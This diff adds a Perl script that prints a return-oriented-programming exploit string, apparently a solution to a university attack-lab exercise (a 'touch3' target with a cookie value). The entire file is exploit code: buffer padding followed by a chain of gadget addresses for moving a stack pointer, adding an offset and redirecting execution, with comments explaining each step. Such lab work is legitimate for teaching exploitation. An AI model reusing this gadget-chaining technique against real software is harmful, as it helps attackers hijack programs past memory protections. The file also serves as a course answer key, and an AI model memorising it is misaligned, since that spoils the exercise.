@@ -1,0 +1,50 @@
+$var = "a"x40; #padding
+
+# We want to store the address of an instruction on the stack
+# as a base to add the offset to.
+# So point rax to the stack
+# and then store the stack in rdi -> the address of that instruction
+# will go in rdi.
+$var = $var . "\x93\x1b\x40" . "\x00"x5; # mov rsp -> rax
+$var = $var . "\x10\x1b\x40" . "\x00"x5; # mov rax -> rdi
+					# this is so we save the 
+					# address for later.
+$var = $var . "\x17\x1b\x40" . "\x00"x5; # pop -> rax
+
+#This is what is popped into rax:
+# Now we have to put in a value for it to put into rax
+$var = $var . "\x48" . "\x00"x7; #This is the value that we want to add
+				# to rdi to get our pointer.
+
+## Currently, we have an offset value in %rax. We a stack address in 
+# %rdi. We want to add these, but lea adds rdi and rsi. So we need
+# to move %rax into %rsi. 
+# However, there is no gadget for that. So we move
+# rax -> edx -> ecx -> esi
+
+$var = $var . "\x5f\x1b\x40" . "\x00"x5; # mov eax -> edx
+$var = $var . "\x66\x1b\x40" . "\x00"x5; # mov edx -> ecx
+$var = $var . "\x6c\x1b\x40" . "\x00"x5; # mov ecx -> esi
+
+# Next, call lea to add them into rax, then put rax -> rdi
+$var = $var . "\x3c\x1b\x40" . "\x00"x5; # lea (rdi, rsi) -> rax
+$var = $var . "\x10\x1b\x40" . "\x00"x5; # mov rax -> rdi
+
+###############################3
+#$var = $var . "\x17\x1b\x40" . "\x00"x5; #popcookie gagdet to rax
+
+#$var = $var . "4f457c53";# . "\x00"x8; #put cookie string on stack
+
+# now: rax holds the value of cookie.
+# We need to get a pointer to rax and put that in edi
+
+#$var = $var . "\x00\x65\x1a\x40\x00\x00\x00\x00";
+
+# Touch3 address:
+$var = $var . "\x65\x1a\x40" . "\x00"x5; 
+
+#cookie:
+$var = $var . "4f457c53" . "\x00"; # cookie string
+
+
+print $var; 
